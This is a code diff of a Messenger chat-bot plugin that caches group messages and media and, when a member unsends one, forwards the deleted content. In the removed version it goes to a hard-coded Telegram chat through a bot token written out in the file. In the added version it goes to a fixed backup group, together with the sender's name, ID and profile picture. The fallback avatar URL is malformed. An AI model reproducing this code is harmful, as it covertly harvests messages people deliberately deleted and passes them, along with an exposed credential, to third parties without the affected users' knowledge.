@@ -1,335 +1,197 @@
 const fs = require("fs-extra");
 const path = require("path");
+const axios = require("axios");
 
-const LOCKED_AUTHOR = "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
-const TELEGRAM_BOT_TOKEN = "8664273023:AAEu9ICybK8hzbfQNBDNhUR-ADwjreagawI";
-const TELEGRAM_CHAT_ID = "-1004422571292";
+// ⚠️ এখানে আপনার ব্যাকআপ গ্রুপের সঠিক UID দিন
+const TARGET_GROUP = "2193910854791732"; 
 
-const cacheDir = path.join(__dirname, "cache", "unsend_media");
-const settingsPath = path.join(__dirname, "cache", "unsend_settings.json");
-
-global.unsendMemoryMap = global.unsendMemoryMap || new Map();
-
-function getAxios() {
-	if (global.nodemodule && global.nodemodule["axios"]) return global.nodemodule["axios"];
-	try { return require("axios"); } catch (e) { return null; }
-}
-
-function getFormData() {
-	if (global.nodemodule && global.nodemodule["form-data"]) return global.nodemodule["form-data"];
-	try { return require("form-data"); } catch (e) { return null; }
-}
-
-const loadSettings = () => {
-	try {
-		if (!fs.existsSync(settingsPath)) {
-			fs.ensureDirSync(path.dirname(settingsPath));
-			fs.writeFileSync(settingsPath, JSON.stringify({}), "utf8");
-			return {};
-		}
-		const content = fs.readFileSync(settingsPath, "utf8");
-		return content ? JSON.parse(content) : {};
-	} catch (err) {
-		return {};
-	}
-};
-
-const saveSettings = (data) => {
-	try {
-		fs.ensureDirSync(path.dirname(settingsPath));
-		fs.writeFileSync(settingsPath, JSON.stringify(data, null, 2), "utf8");
-	} catch (err) {}
-};
-
-let settings = loadSettings();
-
-async function sendToTelegram(captionText, filePaths = []) {
-	const axios = getAxios();
-	const FormData = getFormData();
-	if (!axios) return;
-
-	try {
-		if (filePaths.length === 0 || !FormData) {
-			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-			await axios.post(url, {
-				chat_id: TELEGRAM_CHAT_ID,
-				text: captionText
-			});
-		} else if (filePaths.length === 1) {
-			const filePath = filePaths[0];
-			const ext = path.extname(filePath).toLowerCase();
-			let method = "sendDocument";
-			let fieldName = "document";
-
-			if ([".jpg", ".jpeg", ".png"].includes(ext)) {
-				method = "sendPhoto";
-				fieldName = "photo";
-			} else if ([".mp4", ".mov"].includes(ext)) {
-				method = "sendVideo";
-				fieldName = "video";
-			} else if ([".mp3", ".ogg", ".wav"].includes(ext)) {
-				method = "sendAudio";
-				fieldName = "audio";
-			}
-
-			const formData = new FormData();
-			formData.append("chat_id", TELEGRAM_CHAT_ID);
-			formData.append("caption", captionText);
-			formData.append(fieldName, fs.createReadStream(filePath));
-
-			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
-			await axios.post(url, formData, {
-				headers: formData.getHeaders()
-			});
-		} else {
-			const mediaGroup = [];
-			const formData = new FormData();
-			formData.append("chat_id", TELEGRAM_CHAT_ID);
-
-			filePaths.forEach((filePath, index) => {
-				const ext = path.extname(filePath).toLowerCase();
-				let type = "document";
-				if ([".jpg", ".jpeg", ".png"].includes(ext)) type = "photo";
-				if ([".mp4", ".mov"].includes(ext)) type = "video";
-
-				const attachName = `file${index}`;
-				formData.append(attachName, fs.createReadStream(filePath));
-
-				mediaGroup.push({
-					type: type,
-					media: `attach://${attachName}`,
-					caption: index === 0 ? captionText : ""
-				});
-			});
-
-			formData.append("media", JSON.stringify(mediaGroup));
-			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
-			await axios.post(url, formData, {
-				headers: formData.getHeaders()
-			});
-		}
-	} catch (err) {
-		console.error("Telegram Antiunsend Error:", err.message);
-	}
-}
-
-async function handleUnsendLogic({ api, event, Users, Threads }) {
-	const threadID = event.threadID;
-	if (!threadID) return;
-
-	if (settings[threadID] === false) return;
-
-	if (event.type === "message_unsend") {
-		const savedMsg = global.unsendMemoryMap.get(event.messageID);
-		if (!savedMsg) return;
-
-		const senderID = savedMsg.senderID;
-
-		let senderName = "User";
-		try {
-			if (Users && typeof Users.getNameInBand === "function") {
-				senderName = await Users.getNameInBand(senderID);
-			} else if (Users && typeof Users.getName === "function") {
-				senderName = await Users.getName(senderID);
-			} else if (api && typeof api.getUserInfo === "function") {
-				const res = await api.getUserInfo(senderID);
-				if (res && res[senderID] && res[senderID].name) {
-					senderName = res[senderID].name;
-				}
-			}
-		} catch (e) {}
-
-		let threadName = "Group/Inbox";
-		try {
-			if (Threads && typeof Threads.getName === "function") {
-				threadName = await Threads.getName(threadID);
-			} else if (api && typeof api.getThreadInfo === "function") {
-				const tInfo = await api.getThreadInfo(threadID);
-				if (tInfo && tInfo.threadName) {
-					threadName = tInfo.threadName;
-				}
-			}
-		} catch (e) {}
-
-		let msgContent = savedMsg.body ? savedMsg.body : "নেই (শুধুমাত্র মিডিয়া)";
-
-		let telegramCaption = 
-`👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)
-──────────────────
-👨‍👩‍👧‍👦 Group: ${threadName}
-👤 Sender: ${senderName} (ID: ${senderID})
-💬 Unsent Message:
-${msgContent}`;
-
-		const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
-		await sendToTelegram(telegramCaption, validPaths);
-
-		if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
-			savedMsg.attachmentPaths.forEach(p => {
-				try { fs.unlinkSync(p); } catch (e) {}
-			});
-		}
-
-		global.unsendMemoryMap.delete(event.messageID);
-		return;
-	}
-
-	if (event.type === "message" || event.type === "message_reply") {
-		fs.ensureDirSync(cacheDir);
-
-		let cachedAttachmentPaths = [];
-		const axios = getAxios();
-
-		if (axios && event.attachments && event.attachments.length > 0) {
-			for (let i = 0; i < event.attachments.length; i++) {
-				const att = event.attachments[i];
-				if (att.url) {
-					let ext = "png";
-					if (att.type === "photo") ext = "jpg";
-					else if (att.type === "video") ext = "mp4";
-					else if (att.type === "audio") ext = "mp3";
-					else if (att.type === "animated_image") ext = "gif";
-
-					const filePath = path.join(cacheDir, `${event.messageID}_${i}.${ext}`);
-					try {
-						const response = await axios({
-							method: "GET",
-							url: att.url,
-							responseType: "stream"
-						});
-						const writer = fs.createWriteStream(filePath);
-						response.data.pipe(writer);
-
-						await new Promise((resolve, reject) => {
-							writer.on("finish", resolve);
-							writer.on("error", (err) => {
-								writer.close();
-								reject(err);
-							});
-						});
-						cachedAttachmentPaths.push(filePath);
-					} catch (err) {
-						try { fs.unlinkSync(filePath); } catch (e) {}
-					}
-				}
-			}
-		}
-
-		global.unsendMemoryMap.set(event.messageID, {
-			body: event.body || "",
-			senderID: event.senderID,
-			attachmentPaths: cachedAttachmentPaths,
-			timestamp: Date.now()
-		});
-
-		if (global.unsendMemoryMap.size > 300) {
-			const oldestKey = global.unsendMemoryMap.keys().next().value;
-			const oldData = global.unsendMemoryMap.get(oldestKey);
-			if (oldData && oldData.attachmentPaths) {
-				oldData.attachmentPaths.forEach(p => {
-					try { fs.unlinkSync(p); } catch (e) {}
-				});
-			}
-			global.unsendMemoryMap.delete(oldestKey);
-		}
-	}
-}
+if (!global.resendCache) global.resendCache = new Map();
+fs.ensureDirSync(path.join(__dirname, "cache"));
 
 module.exports = {
-	config: {
-		name: "antiunsend",
-		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
-		version: "12.0",
-		author: LOCKED_AUTHOR,
-		countDown: 0,
-		role: 0,
-		shortDescription: {
-			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড সিস্টেম"
-		},
-		longDescription: {
-			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড সিস্টেম (সরাসরি টেলিগ্রাম)"
-		},
-		category: "system",
-		guide: {
-			bn: "{pn} <on|off>\n{pn} status"
-		}
-	},
+  config: {
+    name: "resend",
+    version: "12.0",
+    author: "ARIYAN", 
+    countDown: 5,
+    role: 1,
+    description: "Unsend message backup system with internal user info avatar injection",
+    category: "events",
+    guide: {
+      en: "This is an automated background event. No command required."
+    }
+  },
 
-	onStart: async function ({ api, event, args }) {
-		if (module.exports.config.author !== LOCKED_AUTHOR) {
-			module.exports.config.author = LOCKED_AUTHOR;
-		}
+  onStart: async function ({ message }) {
+    return message.reply(`📌 Resend Backup System চালু আছে।\n\nসব ধরণের ডিলিট হওয়া মেসেজ এবং প্রোফাইল পিকচার সরাসরি ব্যাকআপ গ্রুপে পাঠানো হচ্ছে।`);
+  },
 
-		const threadID = event.threadID;
+  onChat: async function ({ api, event, usersData, threadsData }) {
+    try {
+      const { type, messageID, senderID, threadID, body, attachments } = event;
 
-		if (settings[threadID] === undefined) {
-			settings[threadID] = true;
-			saveSettings(settings);
-		}
+      // ===== ১. মেসেজ ক্যাশ করা =====
+      if (type === "message" || type === "message_reply") {
+        if (messageID && senderID) {
+          global.resendCache.set(messageID, {
+            body: body || "",
+            senderID,
+            attachments: attachments || [],
+            threadID,
+            timestamp: Date.now()
+          });
 
-		const option = args[0]?.toLowerCase();
+          if (global.resendCache.size > 2000) {
+            const oldest = global.resendCache.keys().next().value;
+            global.resendCache.delete(oldest);
+          }
+        }
+        return;
+      }
 
-		if (option === "on") {
-			settings[threadID] = true;
-			saveSettings(settings);
-			return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 
-» 🔐 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!
-» 📌 𝐒𝐭𝐚𝐭𝐮𝐬: Enabled ✅
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-		}
+      // ===== ২. আনসেন্ড ট্র্যাকিং =====
+      if (type === "message_unsend") {
+        const msg = global.resendCache.get(messageID);
 
-		if (option === "off") {
-			settings[threadID] = false;
-			saveSettings(settings);
-			return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 
-» 🎀 𝐃𝐄𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!
-» 📌 𝐒𝐭𝐚𝐭𝐮𝐬: Disabled ❌
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-		}
+        let name = "Unknown User";
+        let threadName = "Unknown Group";
+        let deletedBody = "(No text / Media Content)";
+        let avatarUrl = "";
 
-		if (option === "status" || option === "info") {
-			const isON = settings[threadID] !== false;
-			const statusStr = isON ? "ON ✅" : "OFF ❌";
-			return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» 🛡️ 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 𝐒𝐓𝐀𝐓𝐔𝐒:
-» 📌 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐒𝐭𝐚𝐭𝐮𝐬: 
-» 🪯 ${statusStr}
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-		}
+        // বটের ইন্টারনাল ফাংশন দিয়ে নাম ও প্রোফাইল পিকচারের ডাইনামিক ইউআরএল সংগ্রহ
+        try {
+          const info = await api.getUserInfo(senderID);
+          if (info && info[senderID]) {
+            name = info[senderID].name || "Unknown User";
+            avatarUrl = info[senderID].thumbSrc || ""; 
+          }
+        } catch (e) {
+          try {
+            const userData = await usersData.get(senderID);
+            name = userData?.name || "Unknown User";
+          } catch {}
+        }
 
-		return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-📌 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 𝐆𝐔𝐈𝐃𝐄:
+        // গ্রুপের নাম সংগ্রহ
+        try {
+          const threadInfo = await api.getThreadInfo(threadID);
+          threadName = threadInfo?.threadName || threadInfo?.name || "Unknown Group";
+        } catch {
+          try {
+            const threadData = await threadsData.get(threadID);
+            threadName = threadData?.threadName || threadData?.name || "Unknown Group";
+          } catch {}
+        }
 
-» antiunsend on - অন করুন
-» antiunsend off - অফ করুন
-» antiunsend status - স্ট্যাটাস দেখুন
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-	},
+        if (msg) {
+          deletedBody = msg.body || "(No text)";
+        }
 
-	// GoatBot standard entry points
-	onChat: async function (params) {
-		return await handleUnsendLogic(params);
-	},
+        const text = `🗑️ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗨𝗻𝘀𝗲𝗻𝗱 𝗔𝗹𝗲𝗿𝘁 (𝗕𝗮𝗰𝗸𝘂𝗽)
 
-	onEvent: async function (params) {
-		return await handleUnsendLogic(params);
-	},
+📌 From Group : ${threadName}
+👤 Deleted By : ${name}
+🆔 UID        : ${senderID}
+⏰ Time       : ${new Date().toLocaleString("en-BD", { timeZone: "Asia/Dhaka" })}
 
-	handleEvent: async function (params) {
-		return await handleUnsendLogic(params);
-	}
+💬 Deleted Content:
+${deletedBody}`;
+
+        const pathsToClean = [];
+        const streams = [];
+
+        // ========== বটের ইন্টারনাল টোকেন দিয়ে প্রোফাইল পিকচার ডাউনলোড (১০০% সাকসেস মেথড) ==========
+        if (avatarUrl) {
+          try {
+            const ppPath = path.join(__dirname, "cache", `pp_${senderID}_${Date.now()}.jpg`);
+            const res = await axios.get(avatarUrl, { responseType: "arraybuffer" });
+            
+            if (res.data && res.data.byteLength > 100) {
+              fs.writeFileSync(ppPath, Buffer.from(res.data));
+              pathsToClean.push(ppPath);
+              streams.push(fs.createReadStream(ppPath));
+            }
+          } catch (e) {
+            console.log("[resend] Internal Avatar download failed, trying fallback graph URL...");
+          }
+        }
+
+        // ফলব্যাক মেথড: ইন্টারনাল সোর্স কাজ না করলে পাবলিক গ্রাফ মেথড ট্রাই করবে
+        if (streams.length === 0) {
+          try {
+            const ppPath = path.join(__dirname, "cache", `pp_${senderID}_${Date.now()}.jpg`);
+            const fallbackUrl = `https://facebook.com{senderID}/picture?type=large`;
+            const res = await axios.get(fallbackUrl, {
+              responseType: "arraybuffer",
+              headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            if (res.data && res.data.byteLength > 200) {
+              fs.writeFileSync(ppPath, Buffer.from(res.data));
+              pathsToClean.push(ppPath);
+              streams.push(fs.createReadStream(ppPath));
+            }
+          } catch (e) {
+            console.log("[resend] All profile picture methods failed.");
+          }
+        }
+
+        // ========== ডিলিট করা মিডিয়া অ্যাটাচমেন্ট ডাউনলোড ==========
+        if (msg?.attachments?.length > 0) {
+          for (const att of msg.attachments) {
+            try {
+              if (!att.url) continue;
+
+              let ext = ".bin";
+              if (att.type === "photo" || att.type === "animated_image") ext = ".jpg";
+              else if (att.type === "video") ext = ".mp4";
+              else if (att.type === "audio" || att.type === "voice") ext = ".mp3";
+              else if (att.type === "sticker") ext = ".png";
+              else if (att.type === "share") ext = ".jpg";
+              else if (att.filename) ext = path.extname(att.filename) || ".bin";
+
+              const filePath = path.join(__dirname, "cache", `file_${Date.now()}_${Math.floor(Math.random() * 9999)}${ext}`);
+              
+              const res = await axios.get(att.url, {
+                responseType: "arraybuffer",
+                timeout: 30000,
+                maxRedirects: 5,
+                headers: { "User-Agent": "Mozilla/5.0" }
+              });
+
+              if (res.data && res.data.byteLength > 500) {
+                fs.writeFileSync(filePath, Buffer.from(res.data));
+                pathsToClean.push(filePath);
+                streams.push(fs.createReadStream(filePath));
+              }
+            } catch (e) {
+              console.log("[resend] Attachment error:", e.message);
+            }
+          }
+        }
+
+        // ========== শুধুমাত্র ব্যাকআপ গ্রুপে অ্যালার্ট পাঠানো ==========
+        if (TARGET_GROUP) {
+          api.sendMessage(
+            {
+              body: text,
+              attachment: streams.length > 0 ? streams : undefined
+            },
+            TARGET_GROUP,
+            () => {
+              // ফাইল ক্যাশ পরিষ্কার করা
+              pathsToClean.forEach(p => {
+                try {
+                  if (fs.existsSync(p)) fs.unlinkSync(p);
+                } catch {}
+              });
+            }
+          );
+        }
+
+        global.resendCache.delete(messageID);
+      }
+    } catch (err) {
+      console.log("[resend] Error:", err.message || err);
+    }
+  }
 };
